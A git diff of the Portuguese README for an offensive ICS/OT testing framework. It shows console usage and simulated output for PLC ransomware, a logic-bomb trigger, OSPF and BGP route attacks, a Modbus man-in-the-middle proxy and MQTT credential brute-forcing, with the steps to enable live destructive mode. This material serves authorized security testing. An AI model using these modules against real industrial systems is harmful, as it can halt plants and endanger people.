@@ -15,7 +15,7 @@
 [![MITRE ATT&CK ICS](https://img.shields.io/badge/MITRE%20ATT%26CK%20ICS-v19-red)](https://attack.mitre.org/matrices/ics/)
 [![Plataforma](https://img.shields.io/badge/Plataforma-OT%20%7C%20ICS%20%7C%20SCADA%20%7C%20IIoT-darkred)](https://github.com/mrhenrike/IndustrialXPL-Forge)
 
-**Python-First. Implementação pura em Python — instale e execute com um único `pip install`.**
+**Python-First. Implementação pura em Python - instale e execute com um único `pip install`.**
 
 ---
 
@@ -48,8 +48,8 @@ OSINT → Descoberta → Fingerprint → Verificação de Vulnerabilidade → Ex
 ```
 
 **Funcionalidades principais:**
-- **Python-First**: toda a funcionalidade central funciona com `pip install industrialxpl` — runtimes externos (C, Go, Java) são aceleradores opcionais com fallback Python embutido
-- **SafeMode por padrão**: todo módulo executa em modo simulação — imprime o payload sem enviar
+- **Python-First**: toda a funcionalidade central funciona com `pip install industrialxpl` - runtimes externos (C, Go, Java) são aceleradores opcionais com fallback Python embutido
+- **SafeMode por padrão**: todo módulo executa em modo simulação - imprime o payload sem enviar
 - **MITRE ATT&CK for ICS v19**: 79 técnicas mapeadas, sintaxe `ttp T0843 192.168.1.100`
 - **Cobertura de CVEs**: 3.300+ CVEs ICS/OT de CVSS 0,1 a 10,0
 - **50 vendors**: Siemens, Schneider, Rockwell, ABB, Honeywell, WEG, NOVA Smar, e mais
@@ -63,14 +63,14 @@ OSINT → Descoberta → Fingerprint → Verificação de Vulnerabilidade → Ex
 # Abrir o shell interativo do IXF
 ixf
 
-# Carregar e executar um módulo (modo simulação por padrão — seguro)
+# Carregar e executar um módulo (modo simulação por padrão - seguro)
 ixf > use scanners/ics/modbus_detect
 ixf > set target 192.168.1.100
 ixf > check
 
 # Executar um TTP-ID contra um alvo
-ixf > ttp T0843 192.168.1.100          # Program Download — todos os módulos
-ixf > ttp T0878 10.0.0.0/24            # Alarm Suppression — varredura de sub-rede
+ixf > ttp T0843 192.168.1.100          # Program Download - todos os módulos
+ixf > ttp T0878 10.0.0.0/24            # Alarm Suppression - varredura de sub-rede
 ixf > ttp-list --tactic evasion        # Listar TTP-IDs de Evasão
 
 # Varredura MITRE ATT&CK for ICS
@@ -93,7 +93,7 @@ ixf > mitre-report layer               # Layer JSON para ATT&CK Navigator
 
 ## SafeMode / DestructiveMode
 
-**Todo módulo é executado em modo simulação por padrão** — imprime o que FARIA sem enviar nenhum pacote.
+**Todo módulo é executado em modo simulação por padrão** - imprime o que FARIA sem enviar nenhum pacote.
 
 ```
 ixf (FrostyGoop) > run                 # SIMULAÇÃO: imprime payload, não envia
@@ -140,26 +140,26 @@ Documentação completa disponível em inglês e português brasileiro:
 
 ## BLOCO J - Categorias de Ataque (v2.0.0)
 
-> **AVISO LEGAL:** Todos os modulos desta secao sao destinados **exclusivamente a testes de seguranca autorizados, pesquisa e uso educacional**. A execucao contra sistemas sem autorizacao expressa e por escrito configura crime federal de acordo com as leis de fraude cibernetica. Os autores e a Uniao Geek nao assumem responsabilidade por uso indevido.
+> **AVISO LEGAL:** Todos os módulos desta seção são destinados **exclusivamente a testes de segurança autorizados, pesquisa e uso educacional**. A execução contra sistemas sem autorização expressa e por escrito configura crime federal de acordo com as leis de fraude cibernética. Os autores e a União Geek não assumem responsabilidade por uso indevido.
 
-### Ransomware (OT/ICS) - Apenas Simulacao Educacional
+### Ransomware (OT/ICS) - Apenas Simulação Educacional
 
-> **AVISO:** Modulos de ransomware sao ESTRITAMENTE em modo simulacao por padrao.
-> Confirmacao tripla obrigatoria para execucao ao vivo. Uso nao autorizado e crime federal.
+> **AVISO:** Módulos de ransomware são ESTRITAMENTE em modo simulação por padrão.
+> Confirmação tripla obrigatória para execução ao vivo. Uso não autorizado é crime federal.
 
 ```bash
 ixf > use exploits/ransomware/plc_project_locker
 ixf (PLCProjectLocker) > set target 192.168.1.10
 ixf (PLCProjectLocker) > set port 502
-ixf (PLCProjectLocker) > set simulate true   # Flag de seguranca obrigatoria
+ixf (PLCProjectLocker) > set simulate true   # Flag de segurança obrigatória
 ixf (PLCProjectLocker) > run
 
-[SIMULATE] Conexao Modbus TCP para 192.168.1.10:502
+[SIMULATE] Conexão Modbus TCP para 192.168.1.10:502
 [SIMULATE] Zeraria registradores holding: FC16 @ addr 0 len 125
-[SIMULATE] 2 requisicoes FC16 necessarias (123 + 2 registradores)
-[SIMULATE] Impacto: PLC pararia execucao do programa - TTP CISA AA26-097A
+[SIMULATE] 2 requisições FC16 necessárias (123 + 2 registradores)
+[SIMULATE] Impacto: PLC pararia execução do programa - TTP CISA AA26-097A
 [!] Para executar ao vivo: set simulate false, set destructive true
-[!] Em seguida, digite a string de confirmacao: I_UNDERSTAND_THIS_IS_DESTRUCTIVE
+[!] Em seguida, digite a string de confirmação: I_UNDERSTAND_THIS_IS_DESTRUCTIVE
 ```
 
 ```bash
@@ -171,18 +171,18 @@ ixf (HMIDisplayRansomware) > run
 
 [SIMULATE] Escreveria 20 registradores (40 chars) no registrador Modbus 1000
 [SIMULATE] Tela do HMI exibiria: "YOUR SYSTEM IS LOCKED..."
-[SIMULATE] Baseado no TTP de manipulacao de HMI do TRITON/TRISIS
-[!] Gate triplo obrigatorio para execucao ao vivo
+[SIMULATE] Baseado no TTP de manipulação de HMI do TRITON/TRISIS
+[!] Gate triplo obrigatório para execução ao vivo
 ```
 
-| Modulo | Caminho | Impacto | Requer |
+| Módulo | Caminho | Impacto | Requer |
 |--------|---------|---------|--------|
-| `plc_project_locker` | `exploits/ransomware/` | CATASTROFICO | Gate triplo |
-| `hmi_display_ransomware` | `exploits/ransomware/` | CATASTROFICO | Gate triplo |
+| `plc_project_locker` | `exploits/ransomware/` | CATASTRÓFICO | Gate triplo |
+| `hmi_display_ransomware` | `exploits/ransomware/` | CATASTRÓFICO | Gate triplo |
 
-### Persistencia
+### Persistência
 
-> **AVISO:** Modulos de logic bomb simulam a ativacao de rotinas pre-plantadas no PLC. A execucao nao autorizada interrompe processos fisicos.
+> **AVISO:** Módulos de logic bomb simulam a ativação de rotinas pré-plantadas no PLC. A execução não autorizada interrompe processos físicos.
 
 ```bash
 ixf > use exploits/persistence/plc_logic_bomb_inject
@@ -194,18 +194,18 @@ ixf (PLCLogicBombActivate) > run
 
 [SIMULATE] Escreveria valor 0xDEAD (57005) no registrador holding 9999
 [SIMULATE] Em 192.168.1.10:502 unit_id=1 usando FC16
-[SIMULATE] Se uma rotina de logic bomb monitorar o registrador 9999, ela sera ativada
+[SIMULATE] Se uma rotina de logic bomb monitorar o registrador 9999, ela será ativada
 [SIMULATE] Baseado nos TTPs do malware ICS INCONTROLLER/PIPEDREAM (Dragos 2022)
-[!] Set destructive true para executar apos confirmacao
+[!] Set destructive true para executar após confirmação
 ```
 
-| Modulo | Caminho | Impacto | Referencia |
+| Módulo | Caminho | Impacto | Referência |
 |--------|---------|---------|-----------|
 | `plc_logic_bomb_inject` | `exploits/persistence/` | ALTO | CISA AA22-103A, Dragos CHERNOVITE |
 
 ### Envenenamento de Tabela de Roteamento
 
-> **AVISO:** Ataques de injecao de rota redirecionam trafego de rede e podem interromper servicos OT/IT em producao. Apenas para laboratório autorizado.
+> **AVISO:** Ataques de injeção de rota redirecionam tráfego de rede e podem interromper serviços OT/IT em produção. Apenas para laboratório autorizado.
 
 ```bash
 ixf > use exploits/routing/ospf_lsa_inject
@@ -215,12 +215,12 @@ ixf (OSPFLSAInject) > set poison_prefix 10.0.0.0
 ixf (OSPFLSAInject) > set simulate true
 ixf (OSPFLSAInject) > run
 
-[SIMULATE] LSA OSPF Tipo Router (Tipo 1) seria construido:
+[SIMULATE] LSA OSPF Tipo Router (Tipo 1) seria construído:
 [SIMULATE]   Area: 0.0.0.0 / Router-ID: 192.168.1.100
 [SIMULATE]   Rede: 10.0.0.0/255.255.255.0 via metrica=1
 [SIMULATE] Pacote LSU (72 bytes): 02010024...
 [SIMULATE] Seria enviado para 224.0.0.5 (AllSPFRouters) x3 na eth0
-[!] PRE-REQUISITO: Scapy + segmento de rede rodando OSPF (sem autenticacao)
+[!] PRÉ-REQUISITO: Scapy + segmento de rede rodando OSPF (sem autenticação)
 ```
 
 ```bash
@@ -231,22 +231,22 @@ ixf (BGPVortexDoS) > set victim_as 65000
 ixf (BGPVortexDoS) > set simulate true
 ixf (BGPVortexDoS) > run
 
-[SIMULATE] Estabeleceria sessao BGP para 10.0.0.1:179
+[SIMULATE] Estabeleceria sessão BGP para 10.0.0.1:179
 [SIMULATE] UPDATE-A: AS_PATH=[65001,65000] MED=100 COMMUNITY=65001:100
 [SIMULATE] UPDATE-B: WITHDRAW + re-announce AS_PATH=[65001] MED=200
 [SIMULATE] UPDATE-C: AS_PATH=[65001,65000,65001] MED=50 COMMUNITY=65001:50
-[SIMULATE] Essas mensagens causam oscilacao persistente no Processo de Decisao BGP (Efeito Vortex)
-[SIMULATE] Referencia: Stoeger et al., USENIX Security 2025 - BGP Vortex
+[SIMULATE] Essas mensagens causam oscilação persistente no Processo de Decisão BGP (Efeito Vortex)
+[SIMULATE] Referência: Stoeger et al., USENIX Security 2025 - BGP Vortex
 ```
 
-| Modulo | Caminho | Impacto | Referencia |
+| Módulo | Caminho | Impacto | Referência |
 |--------|---------|---------|-----------|
 | `ospf_lsa_inject` | `exploits/routing/` | ALTO | DCmal-2025 OSPF spoofing (MDPI 2025), RFC 2328 |
 | `bgp_vortex_dos` | `exploits/routing/` | ALTO | Stoeger et al., USENIX Security 2025 |
 
 ### MiTM - Proxy Modbus TCP Inline
 
-> **AVISO:** O proxy inline com injecao de valores falsifica leituras de sensores entregues aos operadores. Pode causar julgamento incorreto do processo com consequencias fisicas. Apenas laboratorio autorizado.
+> **AVISO:** O proxy inline com injeção de valores falsifica leituras de sensores entregues aos operadores. Pode causar julgamento incorreto do processo com consequências físicas. Apenas laboratório autorizado.
 
 ```bash
 ixf > use assessment/lateral/modbus_mitm_inline
@@ -257,10 +257,10 @@ ixf (ModbusMiTM) > set simulate true
 ixf (ModbusMiTM) > run
 
 [SIMULATE] Ligaria proxy TCP em 0.0.0.0:1502
-[SIMULATE] Encaminharia todas as conexoes para o PLC real em 192.168.1.10:502
-[SIMULATE] Todos os frames Modbus registrados com info de codigo de funcao decodificada
+[SIMULATE] Encaminharia todas as conexões para o PLC real em 192.168.1.10:502
+[SIMULATE] Todos os frames Modbus registrados com info de código de função decodificada
 
-# Captura passiva ao vivo (sem injecao de valores):
+# Captura passiva ao vivo (sem injeção de valores):
 ixf (ModbusMiTM) > set simulate false
 ixf (ModbusMiTM) > run
 
@@ -272,7 +272,7 @@ ixf (ModbusMiTM) > run
 [>] FC16 WriteRegs addr=0 data=[...] -> PLC  [REGISTRADO]
 ```
 
-| Modulo | Caminho | Impacto | Pre-requisitos |
+| Módulo | Caminho | Impacto | Pré-requisitos |
 |--------|---------|---------|----------------|
 | `modbus_mitm_inline` | `assessment/lateral/` | ALTO | ARP poisoning ativo (usar modbus_arp_mitm primeiro) |
 
@@ -287,25 +287,25 @@ ixf (MQTTBruteforce) > run
 
 [SIMULATE] Tentaria 18 pares de credenciais contra o broker MQTT em 192.168.1.50:1883
 [SIMULATE] Primeiros 5: admin:admin, admin:password, admin:, :, guest:guest
-[SIMULATE] Fonte: padroes ICS integrados (Mosquitto, HiveMQ, EMQX, especificos SCADA)
+[SIMULATE] Fonte: padrões ICS integrados (Mosquitto, HiveMQ, EMQX, específicos SCADA)
 ```
 
-| Modulo | Caminho | Impacto | Referencia |
+| Módulo | Caminho | Impacto | Referência |
 |--------|---------|---------|-----------|
-| `ics_mqtt_bruteforce` | `creds/generic/` | MEDIO | OASIS MQTT v3.1.1, MITRE T0806 |
+| `ics_mqtt_bruteforce` | `creds/generic/` | MÉDIO | OASIS MQTT v3.1.1, MITRE T0806 |
 
 ### Resumo de Cobertura
 
-| Categoria | Modulos | Modo Padrao |
+| Categoria | Módulos | Modo Padrão |
 |-----------|---------|------------|
 | Ransomware / Impacto | `plc_project_locker`, `hmi_display_ransomware` | simulate=True (gate triplo para ao vivo) |
-| Persistencia | `plc_logic_bomb_inject` | simulate=True |
+| Persistência | `plc_logic_bomb_inject` | simulate=True |
 | Roteamento (RTP) | `ospf_lsa_inject`, `bgp_vortex_dos` | simulate=True |
 | MiTM | `modbus_arp_mitm`, `modbus_mitm_inline` | simulate=True |
-| Credenciais | `ics_mqtt_bruteforce`, + 30+ modulos vendor | simulate=True |
+| Credenciais | `ics_mqtt_bruteforce`, + 30+ módulos vendor | simulate=True |
 | CVE 2025 | `siemens_telecontrol_cve_2025` | simulate=True |
 
-Todos os modulos destrutivos utilizam `simulate=True` por padrao. Modulos de ransomware/wiper exigem confirmacao de gate triplo: `simulate=False` + `destructive=True` + `explicit_confirm="I_UNDERSTAND_THIS_IS_DESTRUCTIVE"`.
+Todos os módulos destrutivos utilizam `simulate=True` por padrão. Módulos de ransomware/wiper exigem confirmação de gate triplo: `simulate=False` + `destructive=True` + `explicit_confirm="I_UNDERSTAND_THIS_IS_DESTRUCTIVE"`.
 
 Esta ferramenta é destinada **exclusivamente a testes de segurança autorizados, pesquisa e fins educacionais**.
 
